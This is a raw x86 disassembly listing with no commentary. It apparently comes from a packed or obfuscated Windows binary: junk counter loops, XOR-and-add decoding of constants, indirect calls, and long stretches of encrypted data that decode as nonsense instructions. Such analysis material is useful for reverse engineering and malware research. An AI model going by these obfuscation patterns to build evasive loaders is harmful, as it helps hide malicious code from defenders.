  406220:	and    DWORD PTR [edx+0x4fc12ab],edx
  406226:	pop    eax
  406227:	cwde   
  406228:	call   0x2e61:0x61452dd2
  40622f:	jmp    0x40621d
  406231:	pop    es
  406232:	add    ebx,ebx
  406234:	or     BYTE PTR [eax],dh
  406236:	dec    eax
  406237:	outs   dx,DWORD PTR ds:[esi]
  406238:	mov    ah,0xf5
  40623a:	(bad)  
  40623b:	jae    0x406212
  40623d:	out    0x28,al
  40623f:	ins    BYTE PTR es:[edi],dx
  406240:	jno    0x406299
  406242:	cld    
  406243:	or     ebx,edi
  406245:	pop    ecx
  406246:	pop    edi
  406247:	mov    ch,0x10
  406249:	loopne 0x4061e9
  40624b:	rcr    BYTE PTR [ebp-0x40ae95b8],0x6f
  406252:	push   cs
  406253:	pop    ss
  406254:	mov    ebx,0x14c6f52c
  406259:	dec    edx
  40625a:	int    0x16
  40625c:	dec    ebx
  40625d:	loop   0x406244
  40625f:	clc    
  406260:	mov    BYTE PTR [edi+0x4b],dl
  406263:	imul   esi,DWORD PTR [ebx],0xfffffff0
  406266:	and    DWORD PTR ds:0x433823,0x0
  406270:	jmp    0x406282
  406275:	mov    ecx,DWORD PTR ds:0x433823
  40627b:	inc    ecx
  40627c:	mov    DWORD PTR ds:0x433823,ecx
  406282:	cmp    DWORD PTR ds:0x433823,0x1d
  406289:	jae    0x4062c6
  40628f:	cmp    DWORD PTR ds:0x433823,0xb
  406296:	jne    0x4062a7
  40629c:	push   0x3d1a
  4062a1:	call   DWORD PTR ds:0x4120c8
  4062a7:	cmp    DWORD PTR ds:0x433823,0xa
  4062ae:	jne    0x4062c1
  4062b4:	mov    ecx,DWORD PTR ds:0x433823
  4062ba:	inc    ecx
  4062bb:	mov    DWORD PTR ds:0x433823,ecx
  4062c1:	jmp    0x406275
  4062c6:	mov    eax,DWORD PTR [edx+0x194]
  4062cc:	mov    ecx,DWORD PTR [eax]
  4062ce:	mov    eax,DWORD PTR [ecx+0x3c]
  4062d1:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4062d5:	add    eax,ecx
  4062d7:	mov    DWORD PTR [ebp+0x8],esi
  4062da:	mov    DWORD PTR [ebp+0x10],eax
  4062dd:	mov    eax,DWORD PTR [ebp+0x10]
  4062e0:	pop    esi
  4062e1:	test   eax,eax
  4062e3:	je     0x406656
  4062e9:	push   DWORD PTR ds:0x413c0c
  4062ef:	push   DWORD PTR ds:0x4139b8
  4062f5:	mov    eax,DWORD PTR [edx+0x194]
  4062fb:	push   DWORD PTR [eax]
  4062fd:	mov    eax,DWORD PTR [ebp+0x10]
  406300:	jmp    0x40664f
  406305:	lahf   
  406306:	cmp    al,0x1a
  406308:	push   ds
  406309:	pop    ecx
  40630a:	fcomp  DWORD PTR [ebx-0x2e0ee343]
  406310:	cmc    
  406311:	repz in al,dx
  406313:	pop    eax
  406314:	pop    edi
  406315:	push   esp
  406316:	aas    
  406317:	jle    0x406397
  406319:	sub    al,0x7d
  40631b:	jle    0x40639b
  40631d:	inc    eax
  40631e:	nop
  40631f:	lods   al,BYTE PTR ds:[esi]
  406320:	frstor [eax+ebp*1]
  406323:	push   0xffffffc7
  406325:	xor    DWORD PTR [ebx+0xa],0xffffff94
  406329:	or     DWORD PTR ds:0x3bf1b324,edx
  40632f:	mov    dh,0x53
  406331:	(bad)  
  406332:	ficomp DWORD PTR [edi-0x3f]
  406335:	push   cs
  406336:	xchg   edx,eax
  406337:	daa    
  406338:	jl     0x40631a
  40633a:	into   
  40633b:	test   eax,0x23bb13f0
  406340:	icebp  
  406341:	adc    al,0x6e
  406343:	in     al,0x7a
  406345:	and    BYTE PTR [esi+esi*2],bl
  406348:	test   DWORD PTR [eax-0x154d316e],edx
  40634e:	gs repnz mov ebx,0xa04dfb39
  406355:	dec    edx
  406356:	leave  
  406357:	or     al,0x1
  406359:	mov    edi,0x7abd8103
  40635e:	xchg   esp,eax
  40635f:	ror    BYTE PTR [edi],0x82
  406362:	arpl   WORD PTR [edx],ax
  406364:	mov    ebp,0x9a9de059
  406369:	adc    esp,DWORD PTR [eax-0x1]
  40636c:	or     al,0xb5
  40636e:	leave  
  40636f:	pop    eax
  406370:	fistp  QWORD PTR ds:0x19921c05
  406376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406377:	jle    0x406380
  406379:	jae    0x406335
  40637b:	sbb    eax,0xb6277d96
  406380:	and    eax,0x1e592470
  406385:	ret    0xde33
  406388:	sub    BYTE PTR [esi+eiz*2-0x32150653],dh
  40638f:	inc    eax
  406390:	pushf  
  406391:	fstp   QWORD PTR [esi-0x36]
  406394:	dec    ebx
  406395:	loop   0x4063c9
  406397:	push   edx
  406398:	(bad)  
  406399:	cmp    BYTE PTR [edi+0x2ae631ef],al
  40639f:	test   ah,dl
  4063a1:	and    eax,0xe1e8ddb
  4063a6:	push   ebx
  4063a7:	in     al,0x7
  4063a9:	push   ebx
  4063aa:	outs   dx,BYTE PTR ds:[esi]
  4063ab:	shl    BYTE PTR [ebx+ebp*2+0x66d57910],1
  4063b2:	scas   eax,DWORD PTR es:[edi]
  4063b3:	out    dx,eax
  4063b4:	xor    eax,0xad245b5a
  4063b9:	loopne 0x4063ab
  4063bb:	stos   DWORD PTR es:[edi],eax
  4063bc:	int    0xf3
  4063be:	(bad)  
  4063bf:	fisttp QWORD PTR [eax]
  4063c1:	pop    ebp
  4063c2:	or     esp,DWORD PTR ds:0x4f587653
  4063c8:	int    0x78
  4063ca:	(bad)  
  4063cb:	mov    BYTE PTR [ebx+0x45],bl
  4063ce:	retf   
  4063cf:	sub    DWORD PTR [ebx+0x322a4fea],0xb2ca23b6
  4063d9:	jne    0x4063c3
  4063db:	mov    al,ds:0x3f01137f
  4063e0:	xchg   ecx,eax
  4063e1:	ror    bh,cl
  4063e3:	or     BYTE PTR [edi+0x60],dl
  4063e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063e7:	sbb    BYTE PTR [ecx+0x12],ch
  4063ea:	mov    esp,0xfbc28a19
  4063ef:	js     0x40640f
  4063f1:	shl    DWORD PTR [edx-0x48073f5c],1
  4063f7:	jmp    0x4542:0x29cb613f
  4063fe:	retf   0x5caf
  406401:	scas   al,BYTE PTR es:[edi]
  406402:	xchg   ebp,eax
  406403:	mov    BYTE PTR [edi],cl
  406405:	aas    
  406406:	iret   
  406407:	mov    edi,ecx
  406409:	adc    BYTE PTR [ebp-0x48b48943],ch
  40640f:	xchg   DWORD PTR [edx],ebp
  406411:	and    DWORD PTR [eax-0x11c847cd],0xb755c443
  40641b:	(bad)  
  40641d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40641e:	adc    eax,0x2942e11d
  406423:	push   ebp
  406424:	loop   0x406436
  406426:	adc    DWORD PTR [edi],eax
  406428:	sbb    DWORD PTR [ecx+edi*8+0x19a96ace],0x8f6fb671
  406433:	cmp    al,0xe
  406435:	and    al,0x8e
  406437:	fninit 
  406439:	push   cs
  40643a:	bound  ecx,QWORD PTR [edi+0x21]
  40643d:	ja     0x4063eb
  40643f:	jno    0x40643a
  406441:	out    dx,eax
  406442:	inc    ebx
  406443:	add    al,ah
  406445:	aas    
  406446:	xchg   ebx,eax
  406447:	or     eax,0x3a038eb1
  40644c:	ret    0xe01d
  40644f:	cmp    al,0x1e
  406451:	push   ds
  406452:	jge    0x4063d8
  406454:	dec    esp
  406455:	lahf   
  406456:	lods   eax,DWORD PTR ds:[esi]
  406457:	xor    DWORD PTR [ecx-0x63],edx
  40645a:	neg    BYTE PTR [eax+0x74e854bb]
  406460:	mov    ds:0x4e260476,eax
  406465:	out    dx,al
  406466:	unpckhps xmm5,XMMWORD PTR [eax-0xd]
  40646a:	pop    ss
  40646b:	add    al,0x63
  40646d:	cwde   
  40646e:	and    ah,BYTE PTR [esi-0x418b091b]
  406474:	pop    ebx
  406475:	imul   ecx,DWORD PTR [eax-0x57c7b84f],0xfffffff0
  40647c:	popf   
  40647d:	popa   
  40647e:	lock xor al,0xde
  406481:	mov    ds:0x526f005b,al
  406486:	sbb    eax,0x84f1ddcf
  40648b:	or     eax,0xdf8ebdd4
  406490:	aas    
  406491:	cmp    eax,0x603291c8
  406496:	jnp    0x40644f
  406498:	aad    0x1d
  40649a:	ins    DWORD PTR es:[edi],dx
  40649b:	xchg   BYTE PTR ds:0x135c116b,bl
  4064a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064a2:	sti    
  4064a3:	mov    al,ds:0x87f5ae04
  4064a8:	mov    dl,0x50
  4064aa:	sahf   
  4064ab:	jecxz  0x40650d
  4064ad:	ret    
  4064ae:	xor    al,0x1b
  4064b0:	mov    al,0x21
  4064b2:	dec    esi
  4064b3:	lahf   
  4064b4:	jo     0x40649a
  4064b6:	and    ebp,eax
  4064b8:	and    edx,DWORD PTR [edx-0x77ead2b8]
  4064be:	imul   ebx,DWORD PTR [edi+0x35],0x21
  4064c2:	pop    eax
  4064c3:	mov    bl,BYTE PTR [esi+ebx*1]
  4064c6:	cmp    DWORD PTR [eax+0x3a755485],eax
  4064cc:	mov    esi,0xbebbeb6e
  4064d1:	out    dx,eax
  4064d2:	and    al,0x11
  4064d4:	sub    DWORD PTR [edx],esi
  4064d6:	popa   
  4064d7:	popa   
  4064d8:	jo     0x406530
  4064da:	rcl    BYTE PTR [edi],1
  4064dc:	aad    0x1a
  4064de:	jl     0x4064f5
  4064e0:	cmp    al,0x81
  4064e3:	add    DWORD PTR [eiz*2-0x19aaa839],eax
  4064ea:	xor    ebx,eax
  4064ec:	jno    0x40650b
  4064ee:	xchg   ebp,eax
  4064ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064f0:	dec    edi
  4064f1:	daa    
  4064f2:	or     bl,ch
  4064f4:	dec    edi
  4064f5:	or     cl,ch
  4064f7:	fst    QWORD PTR [ecx+edi*8]
  4064fa:	sbb    ebx,DWORD PTR [esi]
  4064fc:	mov    dl,0x13
  4064fe:	and    eax,DWORD PTR [esp+eiz*8+0x2e]
  406502:	and    al,bh
  406504:	mov    eax,DWORD PTR [ebx]
  406506:	out    dx,eax
  406507:	(bad)  
  406508:	aam    0x8e
  40650a:	hlt    
  40650b:	int3   
  40650c:	sub    al,0x3f
  40650e:	pop    ss
  40650f:	iret   
  406510:	mov    WORD PTR [edi-0x4c],?
  406513:	and    al,0x71
  406515:	mov    ch,0x3c
  406517:	or     eax,0xebae7e80
  40651c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40651d:	push   edx
  40651e:	and    al,BYTE PTR [ebx]
  406520:	lahf   
  406521:	xor    BYTE PTR [edi-0x36558e40],0x97
  406528:	jp     0x4065a6
  40652a:	popa   
  40652b:	out    dx,al
  40652c:	and    esi,DWORD PTR [edi]
  40652e:	fbld   TBYTE PTR [esi+0xf]
  406531:	aad    0xc3
  406533:	add    ebx,DWORD PTR [esi+edx*4]
  406536:	sub    al,0x58
  406538:	(bad)  
  406539:	nop
  40653a:	pop    edx
  40653b:	sub    DWORD PTR [esi],0x8c3788f7
  406541:	pop    esi
  406542:	cdq    
  406543:	rcr    DWORD PTR [edi-0x39],1
  406546:	imul   ebx,DWORD PTR [ecx+0x44286253],0x813f628c
  406550:	jle    0x406568
  406552:	push   esi
  406553:	jp     0x406559
  406555:	test   DWORD PTR ds:0x613ef9c8,ebp
  40655b:	push   ds
  40655c:	dec    esp
  40655d:	jg     0x4065de
  40655f:	pop    es
  406560:	lahf   
  406561:	inc    esp
  406562:	mov    edx,0xff1e00d9
  406567:	or     cl,0x46
  40656a:	jmp    0x40650b
  40656c:	cmc    
  40656d:	pop    ecx
  40656e:	in     al,dx
  40656f:	dec    BYTE PTR [ebp-0x2cba6c34]
  406575:	jmp    0xe8ff7379
  40657a:	stos   DWORD PTR es:[edi],eax
  40657b:	xor    al,0xce
  40657d:	in     al,dx
  40657e:	xchg   ebx,eax
  40657f:	mov    dh,0x4e
  406581:	add    eax,0x5da157ec
  406586:	cmp    ebx,edx
  406588:	or     esp,edi
  40658a:	inc    esi
  40658b:	repnz sub ah,BYTE PTR [esi-0x11]
  40658f:	daa    
  406590:	cmp    dl,dl
  406592:	adc    al,0x7
  406594:	ror    BYTE PTR [ecx-0x846d5e3],cl
  40659a:	es mov edx,0x2458f4df
  4065a0:	mov    edx,0x2836e88d
  4065a5:	popa   
  4065a6:	cmp    al,0x93
  4065a8:	scas   eax,DWORD PTR es:[edi]
  4065a9:	mov    cl,0x1d
  4065ab:	ret    
  4065ac:	scas   al,BYTE PTR es:[edi]
  4065ad:	cs push 0xffffffce
  4065b0:	not    DWORD PTR [edi+0x7e50ee35]
  4065b6:	pop    ebp
  4065b7:	pop    ds
  4065b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065b9:	pusha  
  4065ba:	js     0x40656d
  4065bc:	adc    al,0xcf
  4065be:	sub    bl,BYTE PTR [edi+0x540ce17]
  4065c4:	mov    al,BYTE PTR [eax]
  4065c6:	shr    DWORD PTR [edx+0x71],1
  4065c9:	xor    eax,0x996007eb
  4065ce:	sbb    DWORD PTR [ebp+0x1c],ebp
  4065d1:	(bad)  
  4065d2:	xor    eax,0x672695d2
  4065d7:	jnp    0x406572
  4065d9:	fbstp  TBYTE PTR [ebx+0x43211438]
  4065df:	add    BYTE PTR [edi+eax*2+0x515ae2ff],0x77
  4065e7:	lock sbb al,cl
  4065ea:	xor    dh,BYTE PTR [edx]
  4065ec:	ror    BYTE PTR [bp+di-0x1221],cl
  4065f1:	je     0x406580
  4065f3:	push   ebx
  4065f4:	popa   
  4065f5:	ja     0x4065d6
  4065f7:	repnz dec eax
  4065f9:	nop
  4065fa:	rcl    dl,cl
  4065fc:	add    DWORD PTR [eax+eax*4+0x61ba6fa2],0xffffff9b
  406604:	mov    ecx,0xc004307d
  406609:	pop    edi
  40660a:	fsub   DWORD PTR [ecx+eax*8-0x10]
  40660e:	inc    edx
  40660f:	lock cmp ch,BYTE PTR [esi]
  406612:	pop    esi
  406613:	xchg   edi,eax
  406614:	aaa    
  406615:	in     eax,0xab
  406617:	mov    DWORD PTR [edx-0x38],ebp
  40661a:	iret   
  40661b:	jmp    0x9d3b65cd
  406620:	mov    fs,ebp
  406622:	shl    bh,cl
  406624:	(bad)  
  406625:	in     eax,0x6a
  406627:	cs dec ecx
  406629:	xor    DWORD PTR [eax],esp
  40662b:	mov    eax,ds:0xc35e94af
  406630:	xor    ch,BYTE PTR [ecx+edi*4]
  406633:	adc    al,0xb6
  406635:	enter  0x24f,0x91
  406639:	(bad)  
  40663a:	shl    BYTE PTR [edx-0x4e],1
  40663d:	jne    0x406607
  40663f:	nop
  406640:	mov    dl,0x9c
  406642:	dec    edi
  406643:	aad    0x2f
  406645:	push   ebx
  406646:	and    edi,DWORD PTR [edi+edi*8+0x5b978710]
  40664d:	nop
  40664e:	call   ax
  406651:	jmp    0x406659
  406656:	mov    eax,DWORD PTR [ebp+0x10]
  406659:	leave  
  40665a:	ret    0xc
  40665d:	push   ebp
  40665e:	mov    ebp,esp
  406660:	sub    esp,0x28
  406663:	push   0x413cb4
  406668:	call   DWORD PTR ds:0x412408
  40666e:	mov    DWORD PTR ds:0x4336fb,0x6571
  406678:	cmp    WORD PTR [eax],0x0
  40667c:	jne    0x406afe
  406682:	push   0x413d04
  406687:	call   DWORD PTR ds:0x412404
  40668d:	mov    DWORD PTR ds:0x4337d3,0x5ed5
  406697:	cmp    BYTE PTR [eax],0x0
  40669a:	mov    DWORD PTR ds:0x4337a7,0x18c3
  4066a4:	jne    0x406b09
  4066aa:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4066b1:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  4066b8:	lea    eax,[ebp-0x20]
  4066bb:	mov    DWORD PTR [ebp-0x14],eax
  4066be:	lea    eax,[ebp-0x1c]
  4066c1:	and    DWORD PTR ds:0x4337e3,0x0
  4066cb:	mov    ecx,DWORD PTR ds:0x4337e3
  4066d1:	inc    ecx
  4066d2:	mov    DWORD PTR ds:0x4337e3,ecx
  4066d8:	cmp    DWORD PTR ds:0x4337e3,0x5
  4066df:	jne    0x4066f8
  4066e5:	push   0x2ad8
  4066ea:	push   DWORD PTR [ebp-0x1c]
  4066ed:	push   0x433903
  4066f2:	call   DWORD PTR ds:0x412340
  4066f8:	cmp    DWORD PTR ds:0x4337e3,0x4
  4066ff:	jne    0x406714
  406705:	xor    ecx,ecx
  406707:	or     ecx,DWORD PTR ds:0x4337e3
  40670d:	inc    ecx
  40670e:	mov    DWORD PTR ds:0x4337e3,ecx
  406714:	cmp    DWORD PTR ds:0x4337e3,0x1f
  40671b:	jb     0x4066cb
  406721:	movzx  ecx,WORD PTR ds:0x4337d7
  406728:	and    ecx,DWORD PTR ds:0x43370f
  40672e:	mov    DWORD PTR ds:0x4337d7,ecx
  406734:	mov    DWORD PTR [ebp-0x10],eax
  406737:	adc    DWORD PTR ds:0x43371b,ecx
  40673d:	mov    eax,ds:0x413b34
  406742:	sbb    ecx,DWORD PTR ds:0x43382b
  406748:	mov    eax,DWORD PTR [eax+0x1c8]
  40674e:	mov    eax,DWORD PTR [eax]
  406750:	sub    DWORD PTR ds:0x433713,ebx
  406756:	mov    ecx,DWORD PTR [ebp-0x10]
  406759:	push   ebx
  40675a:	xor    DWORD PTR ds:0x43376b,edx
  406760:	push   esi
  406761:	and    DWORD PTR ds:0x433707,0x0
  40676b:	jmp    0x40677d
  406770:	mov    ebx,DWORD PTR ds:0x433707
  406776:	inc    ebx
  406777:	mov    DWORD PTR ds:0x433707,ebx
  40677d:	cmp    DWORD PTR ds:0x433707,0x1b
  406784:	jae    0x4067ac
  40678a:	cmp    DWORD PTR ds:0x433707,0x23
  406791:	jne    0x4067a7
  406797:	push   0x433933
  40679c:	push   DWORD PTR [ebp-0x18]
  40679f:	push   0x0
  4067a1:	call   DWORD PTR ds:0x412344
  4067a7:	jmp    0x406770
  4067ac:	mov    esi,0x7510854
  4067b1:	sub    DWORD PTR ds:0x4337ab,0x6a10
  4067bb:	xor    eax,esi
  4067bd:	adc    DWORD PTR ds:0x433797,0x4337a7
  4067c7:	push   edi
  4067c8:	mov    edi,0x32729b
  4067cd:	add    eax,edi
  4067cf:	mov    ebx,0x337e
  4067d4:	mov    DWORD PTR [ecx],eax
  4067d6:	mov    eax,ds:0x413e08
  4067db:	cmp    eax,0x23c13046
  4067e0:	mov    eax,DWORD PTR [ebp-0x4]
  4067e3:	mov    ebx,0xf89c853d
  4067e8:	je     0x406824
  4067ee:	or     ecx,DWORD PTR ds:0x4337d3
  4067f4:	mov    ecx,DWORD PTR [ebp-0x8]
  4067f7:	sbb    DWORD PTR ds:0x43376b,0x4ed6
  406801:	xor    eax,esi
  406803:	add    eax,edi
  406805:	sbb    DWORD PTR ds:0x433713,0x43379f
  40680f:	imul   eax,ecx
  406812:	mov    DWORD PTR [ebp-0x8],eax
  406815:	mov    DWORD PTR ds:0x433707,0x49d5
  40681f:	jmp    0x4068d7
  406824:	or     ecx,DWORD PTR ds:0x4337af
  40682a:	xor    eax,esi
  40682c:	and    ecx,0x6df5
  406832:	add    eax,edi
  406834:	xor    ecx,ecx
  406836:	add    ecx,DWORD PTR ds:0x4337e3
  40683c:	and    DWORD PTR ds:0x4337a7,ecx
  406842:	mov    ds:0x413c48,eax
  406847:	mov    ecx,DWORD PTR ds:0x43382b
  40684d:	or     DWORD PTR ds:0x4337e3,ecx
  406853:	mov    eax,DWORD PTR [ebp-0x8]
  406856:	add    DWORD PTR ds:0x43375b,0x62ed
  406860:	xor    eax,esi
  406862:	and    DWORD PTR ds:0x43381f,ebx
  406868:	add    eax,edi
  40686a:	mov    ecx,DWORD PTR ds:0x4337ab
  406870:	sub    DWORD PTR ds:0x4337d3,ecx
  406876:	mov    ds:0x413e08,eax
  40687b:	sbb    ecx,ecx
  40687d:	mov    eax,DWORD PTR [ebp-0x4]
  406880:	and    DWORD PTR ds:0x43370b,ecx
  406886:	mov    ecx,DWORD PTR ds:0x413c48
  40688c:	sbb    DWORD PTR ds:0x433707,0x486c
  406896:	xor    eax,esi
  406898:	adc    DWORD PTR ds:0x433713,0x6147
  4068a2:	add    eax,edi
  4068a4:	cmp    ecx,eax
  4068a6:	mov    DWORD PTR ds:0x43370f,0x4c28
  4068b0:	jne    0x4068d7
  4068b6:	sub    DWORD PTR ds:0x433723,0x43382b
  4068c0:	push   ebx
  4068c1:	or     DWORD PTR ds:0x43379b,0x4337df
  4068cb:	push   DWORD PTR [ebp-0x4]
  4068ce:	push   DWORD PTR [ebp-0x8]
  4068d1:	call   DWORD PTR ds:0x413c40
  4068d7:	mov    eax,ds:0x413b34
  4068dc:	mov    eax,DWORD PTR [eax+0x18c]
  4068e2:	and    DWORD PTR ds:0x4337e7,0x433793
  4068ec:	mov    eax,DWORD PTR [eax]
  4068ee:	mov    DWORD PTR [ebp-0x18],eax
  4068f1:	mov    DWORD PTR [ebp-0x10],ebx
  4068f4:	or     DWORD PTR ds:0x433753,0x1d95
  4068fe:	mov    DWORD PTR [ebp-0x10],ebx
  406901:	sub    DWORD PTR ds:0x43375b,0x4337ef
  40690b:	mov    DWORD PTR [ebp-0x10],ebx
  40690e:	sub    DWORD PTR ds:0x4337ab,0x43376f
  406918:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40691f:	and    DWORD PTR ds:0x43375b,0x43379b
  406929:	mov    DWORD PTR [ebp-0x28],ebx
  40692c:	dec    DWORD PTR ds:0x4336fb
  406932:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  406939:	mov    ebx,DWORD PTR [ebp-0x8]
  40693c:	adc    DWORD PTR ds:0x4336fb,0x433723
  406946:	xor    ebx,esi
  406948:	add    ebx,edi
  40694a:	jmp    0x4069ee
  40694f:	not    DWORD PTR ds:0x4337db
  406955:	mov    eax,DWORD PTR [ebp-0x4]
  406958:	xor    eax,esi
  40695a:	lea    eax,[eax+ebx*1+0x32729b]
  406961:	push   eax
  406962:	mov    eax,DWORD PTR [ebp-0x10]
  406965:	xor    eax,esi
  406967:	lea    eax,[ebp+eax*1+0x3272a3]
  40696e:	push   eax
  40696f:	adc    DWORD PTR ds:0x4336ff,0x8003
  406979:	mov    eax,ds:0x413b34
  40697e:	xor    DWORD PTR ds:0x4337ef,0x2bd0
  406988:	push   DWORD PTR [eax+0x1bc]
  40698e:	call   0x40f058
  406993:	mov    eax,DWORD PTR [ebp-0x4]
  406996:	add    ecx,0x2fd0
  40699c:	xor    eax,esi
  40699e:	and    DWORD PTR ds:0x43381b,0x0
  4069a8:	mov    ecx,DWORD PTR ds:0x43381b
  4069ae:	inc    ecx
  4069af:	mov    DWORD PTR ds:0x43381b,ecx
  4069b5:	cmp    DWORD PTR ds:0x43381b,0x17
  4069bc:	jne    0x4069c8
  4069c2:	call   DWORD PTR ds:0x4120cc
  4069c8:	cmp    DWORD PTR ds:0x43381b,0x11
  4069cf:	jb     0x4069a8
  4069d5:	mov    ecx,DWORD PTR ds:0x433797
  4069db:	adc    ecx,DWORD PTR ds:0x43375f
  4069e1:	mov    DWORD PTR ds:0x433797,ecx
  4069e7:	lea    ebx,[ebx+eax*1+0x32729b]
  4069ee:	mov    eax,DWORD PTR [ebp-0x4]
  4069f1:	mov    ecx,DWORD PTR [ebp-0x4]
  4069f4:	xor    ecx,esi
  4069f6:	xor    eax,esi
  4069f8:	add    eax,ecx
  4069fa:	mov    ecx,DWORD PTR [ebp-0x4]
  4069fd:	xor    ecx,esi
  4069ff:	lea    eax,[eax+ecx*1+0x9757d1]
  406a06:	cmp    ebx,eax
  406a08:	jbe    0x40694f
  406a0e:	mov    eax,DWORD PTR [ebp+0xc]
  406a11:	mov    ds:0x4139b8,eax
  406a16:	mov    eax,DWORD PTR [ebp+0x10]
  406a19:	mov    ds:0x413c0c,eax
  406a1e:	mov    eax,ds:0x4139b8
  406a23:	mov    ecx,DWORD PTR [ebp-0x14]
  406a26:	push   DWORD PTR [ebp-0x18]
  406a29:	sub    eax,edi
  406a2b:	push   DWORD PTR [ebp-0x1c]
  406a2e:	xor    eax,esi
  406a30:	mov    DWORD PTR [ecx],eax
  406a32:	push   DWORD PTR [ebp-0x20]
  406a35:	call   0x40d59f
  406a3a:	sub    eax,edi
  406a3c:	xor    eax,esi
  406a3e:	mov    DWORD PTR [ebp+0xc],eax
  406a41:	mov    ecx,DWORD PTR [ebp-0x4]
  406a44:	mov    eax,DWORD PTR [ebp+0xc]
  406a47:	xor    ecx,esi
  406a49:	add    ecx,edi
  406a4b:	xor    edx,edx
  406a4d:	div    ecx
  406a4f:	mov    ecx,DWORD PTR [ebp-0x8]
  406a52:	cmp    ecx,eax
  406a54:	jne    0x406a5f
  406a5a:	call   0x401000
  406a5f:	lea    eax,[ebp+0x4]
  406a62:	mov    DWORD PTR [ebp-0x24],eax
  406a65:	mov    eax,ds:0x413b34
  406a6a:	push   0x4
  406a6c:	add    eax,0x1cc
  406a71:	push   eax
  406a72:	lea    eax,[ebp-0xc]
  406a75:	push   eax
  406a76:	call   0x40f058
  406a7b:	mov    eax,DWORD PTR [ebp-0xc]
  406a7e:	mov    eax,DWORD PTR [ebp-0x4]
  406a81:	mov    eax,DWORD PTR [ebp-0x8]
  406a84:	mov    DWORD PTR [ebp+0xc],eax
  406a87:	mov    eax,ds:0x413bb8
  406a8c:	mov    ecx,DWORD PTR [ebp+0xc]
  406a8f:	sub    eax,edi
  406a91:	xor    eax,esi
  406a93:	cmp    eax,ecx
  406a95:	je     0x406adc
  406a9b:	mov    eax,ds:0x413bb0
  406aa0:	mov    ecx,DWORD PTR [ebp+0xc]
  406aa3:	sub    eax,edi
  406aa5:	xor    eax,esi
  406aa7:	cmp    eax,ecx
  406aa9:	jne    0x406abf
  406aaf:	mov    eax,ds:0x413bb8
  406ab4:	add    eax,DWORD PTR ds:0x413bb0
  406aba:	jmp    0x406ac6
  406abf:	mov    eax,DWORD PTR [ebp+0xc]
  406ac2:	xor    eax,esi
  406ac4:	add    eax,edi
  406ac6:	mov    ds:0x413bb0,eax
  406acb:	mov    eax,DWORD PTR [ebp+0xc]
  406ace:	xor    eax,esi
  406ad0:	add    eax,edi
  406ad2:	mov    ds:0x413bb8,eax
  406ad7:	jmp    0x406ae6
  406adc:	mov    eax,ds:0x413bb8
  406ae1:	mov    ds:0x413bb0,eax
  406ae6:	mov    eax,DWORD PTR [ebp-0x24]
  406ae9:	mov    ecx,DWORD PTR ds:0x413bb0
  406aef:	add    DWORD PTR [eax],ecx
  406af1:	mov    eax,DWORD PTR [ebp-0xc]
  406af4:	mov    eax,DWORD PTR [eax]
  406af6:	pop    edi
  406af7:	pop    esi
  406af8:	pop    ebx
  406af9:	jmp    0x406b0b
  406afe:	push   0x87687689
  406b03:	call   DWORD PTR ds:0x412364
  406b09:	xor    eax,eax
  406b0b:	leave  
  406b0c:	ret    0xc
  406b0f:	push   ebp
  406b10:	mov    ebp,esp
  406b12:	push   ecx
  406b13:	mov    DWORD PTR ds:0x433793,0x272d
  406b1d:	push   ecx
  406b1e:	mov    eax,0x5a3fc98
  406b23:	mov    DWORD PTR [ebp-0x4],eax
  406b26:	mov    DWORD PTR ds:0x433767,ecx
  406b2c:	mov    ecx,DWORD PTR [ebp-0x4]
  406b2f:	mov    DWORD PTR ds:0x433793,0x4de2
  406b39:	mov    DWORD PTR [ebp-0x8],0x4ec1
  406b40:	mov    DWORD PTR ds:0x43370f,0x33b9
  406b4a:	cmp    ecx,eax
  406b4c:	jne    0x40734f
  406b52:	or     ecx,DWORD PTR ds:0x43379b
  406b58:	mov    ax,WORD PTR [ebp-0x8]
  406b5c:	sbb    DWORD PTR ds:0x43371b,ebx
  406b62:	mov    ecx,0x8a3c
  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0xe1331c5f
  406b85:	cmp    DWORD PTR [edx],eax
  406b87:	cmp    edi,DWORD PTR [esi+0x7e]
  406b8a:	mov    esp,0x347e7e7f
  406b8f:	loopne 0x406b22
  406b91:	cmp    ecx,DWORD PTR [ebp+eax*8-0x29bbeeb0]
  406b98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b99:	jns    0x406b51
  406b9b:	pop    eax
  406b9c:	xchg   edx,eax
  406b9d:	test   al,0x5a
  406b9f:	out    dx,eax
  406ba0:	sar    DWORD PTR [ebp+0x6d],cl
  406ba3:	push   esi
  406ba4:	(bad)  
  406ba5:	retf   0x99ca
  406ba8:	push   0xfb4ae621
  406bad:	ds js  0x406b77
  406bb0:	jne    0x406c25
  406bb2:	push   ds
  406bb3:	xchg   ebp,eax
  406bb4:	inc    ecx
  406bb5:	mov    ss:0x57a3bebd,al
  406bbb:	in     al,dx
  406bbc:	push   ds
  406bbd:	jno    0x406b84
  406bbf:	mov    dl,0x96
  406bc1:	add    BYTE PTR [edx-0x16ecaf25],ch
  406bc7:	add    eax,0x9e883be8
  406bcc:	call   0x1b14:0x5f9f9e4b
  406bd3:	daa    
  406bd4:	rcr    bh,cl
  406bd6:	mov    al,ds:0x9ae41f4e
  406bdb:	and    ecx,DWORD PTR [edi-0x4]
  406bde:	ret    0xab49
  406be1:	sbb    al,0xa
  406be3:	pop    esp
  406be4:	or     BYTE PTR [edi],dl
  406be6:	sub    eax,DWORD PTR [ecx]
  406be8:	imul   edi,DWORD PTR [edi],0x5
  406beb:	fxam   
  406bed:	mov    bl,0x4e
  406bef:	inc    esi
  406bf0:	retf   
  406bf1:	jle    0x406bce
  406bf3:	mov    esp,0x4979a664
